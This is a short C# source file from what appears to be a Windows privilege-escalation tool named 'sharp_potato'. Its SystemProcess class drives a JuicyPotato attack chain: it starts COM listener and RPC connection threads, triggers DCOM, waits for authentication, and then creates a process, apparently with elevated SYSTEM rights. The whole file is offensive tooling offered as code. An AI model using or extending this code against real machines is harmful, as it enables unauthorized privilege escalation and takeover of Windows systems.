using System.Diagnostics;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

namespace sharp_potato;

public class SystemProcess
{
    public ProcessStartInfo StartInfo { get; } = new();
    public int Id => (int) processInformation.dwProcessId;

    private Kernel32.SafePROCESS_INFORMATION processInformation;

    public void Start()
    {
        var potato = new JuicyPotato {ProcessStartInfo = StartInfo};

        potato.StartCOMListenerThread();
        potato.StartRPCConnectionThread();
        potato.TriggerDCOM();
        potato.WaitForAuth();
        processInformation = potato.CreateProcess();
    }

    public void WaitForExit() => WaitForSingleObject(processInformation.hProcess, INFINITE);
}